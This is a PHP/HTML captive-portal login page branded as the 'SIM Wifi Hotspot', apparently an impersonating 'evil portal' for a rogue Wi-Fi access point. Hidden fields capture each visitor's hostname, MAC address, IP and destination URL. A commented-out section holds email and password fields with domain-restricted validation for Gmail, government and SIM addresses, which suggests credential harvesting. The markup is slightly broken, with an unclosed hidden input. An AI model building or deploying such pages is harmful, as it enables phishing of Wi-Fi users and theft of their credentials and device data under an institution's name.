<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

  <html>

  <head>

    <title>SIM Wifi Hotspot - Sign In</title>

    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
    <script src="jquery-2.2.1.min.js"></script>
    <script src="jquery.validate.min.js"></script>
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>

    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="icon" type="image/png" href="assets/img/profImage.png"/>

    <style>

  .container label.error {
    margin-top: 4px;
    color:red;
    font-style: italic;
		display: inline;

	}



  form.form-signin label.error {
		display: block;
		margin-left: 1em;

		width: auto;
	}
    body {
      background-image: url("assets/img/background.jpg");
      background-position: center;
      background-attachment: fixed;
      background-repeat: no-repeat;
      -webkit-background-size: 100%;
      -moz-background-size: 100%;
      -o-background-size: 100%;
      background-size: 100%;
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
    }

    .google-header-bar {
    height: 71px;
    border-bottom: 1px solid #e5e5e5;
    overflow: hidden;
    }

    .google-header-bar.centered {
    border: 0;
    height: 108px;
    }

    .google-header-bar.centered .header .logo {
    float: none;
    margin: 40px auto 30px;
    display: block;
    }
    .google-header-bar.centered .header .secondary-link {
    display: none
    }

    .header .logo {
    margin: 17px 0 0;
    float: left;
    height: 38px;
    width: 116px;
    }
    </style>

    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
      .google-header-bar.centered {
        height: 83px;
      }

      .google-header-bar.centered .header .logo {
        margin: 25px auto 20px;
      }

      .card {
        margin-bottom: 20px;
      }
    </style>

    <style media="screen and (max-width: 580px)">
      html,
      body {
        font-size: 14px;
      }

      .google-header-bar.centered {
        height: 73px;
      }

      .google-header-bar.centered .header .logo {
        margin: 20px auto 15px;
      }

      .content {
        padding-left: 10px;
        padding-right: 10px;
      }

      .hidden-small {
        display: none;
      }

      .card {
        padding: 20px 15px 30px;
        width: 270px;
      }

      .footer ul li {
        padding-right: 1em;
      }

      .lang-chooser-wrap {
        display: none;
      }
    </style>

    <!--
          <script>
          	$().ready(function() {

    $.validator.addMethod("emailDomain", function(value, element) {
      var allowedDomains = ["gmail.com", "aol.com", "hotmail.com", "yahoo.com", "outlook.com", "gov.com.sg", "gov.sg", "sim.edu.sg", "sim.com", "edu.sg"];
      var domainEmail = value.split("@")[1]; // Get the domain part of the email address
      return this.optional(element) || $.inArray(domainEmail, allowedDomains) !== -1;
    }     , "Please enter a valid email domain. E.g gmail.com");

    $.validator.addMethod("customPassword", function(value, element) {
        return this.optional(element) || /^(?=.*[A-Z])(?=.*\d).+$/.test(value);
    }, "Your password must contain at least one capital letter and a number.");


		$("#captiveportalForm").validate({
      errorLabelContainer: $("#captiveportalForm div.error"),
      rules: {  
        email: {
          required:true,
          email:true,
          emailDomain:true,
          
        },
        password: {
          required:true,
          minlength: 8,
          customPassword:true,
        }

      }

		});

  
		var container = $('div.container');
		// validate the form when it is submitted

		var validator = $("#captiveportalForm").validate({
			errorContainer: container,
			errorLabelContainer: $("ol", container),
			wrapper: 'li'
		});

		$(".cancel").click(function() {
			validator.resetForm();
		});
  });
  

          </script>
-->
  </head>

  <body>

    <div class="container">
      <div class="account-wall">
        <img class="profile-img" src="assets/img/logo.jpg" alt="logo.jpg"></img>

        <h1 class="text-center login-title">SIM Wifi Hotspot </h1>
        <h2 class="text-center friends-text">Welcome to SIM Wifi hotspot! Please sign in to enjoy free wifi</h2>

          <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin" id="captiveportalForm">

            <!--  <input required type="email" name="email" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>

            <input type="password" name="password" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
          -->
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?> 
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Login</button>
            <div class="text-center terms-text1">Copyright @ 2019 - 2023 SIM, IT division. All Rights Reserved</div>

          </form>






  </body>

</html>
